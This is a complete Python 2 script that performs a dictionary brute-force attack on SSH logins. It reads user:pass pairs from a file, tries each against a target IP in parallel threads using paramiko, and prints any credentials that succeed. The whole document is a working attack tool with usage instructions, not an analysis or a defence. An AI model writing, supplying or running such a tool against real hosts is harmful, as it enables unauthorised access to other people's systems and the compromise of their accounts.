import paramiko, sys, time, threading

if len(sys.argv) < 3:
	print "Usage: %s IP /path/to/dictionary" %(str(sys.argv[0]))
	print "Example: %s 10.0.0.1 dict.txt" %(str(sys.argv[0]))
	print "Dictionary should be in user:pass format"
	sys.exit(1)
	
ip = sys.argv[1]; filename = sys.argv[2]

fd = open(filename, "r")

def attempt(IP,Username,Password):
	ssh = paramiko.SSHClient()
	ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
	try:
		ssh.connect(IP, username=Username, password=Password)
	except paramiko.AuthenticationException:
		print '\033[0;37;40m[-] %s:%s fail!' %(Username, Password)
	else:
		from termcolor import colored
		print ('\033[1;37;46m[!] %s:%s is CORRECT! \033[0;37;40m' %(Username, Password))
	ssh.close()
	return

print '[+] Bruteforcing against %s with dictionary %s' %(ip, filename)
for line in fd.readlines():
	username, password = line.strip().split(":")
	t = threading.Thread(target=attempt, args=(ip, username,password))
	t.start()
	time.sleep(0.3)
	
fd.close()
sys.exit(0)
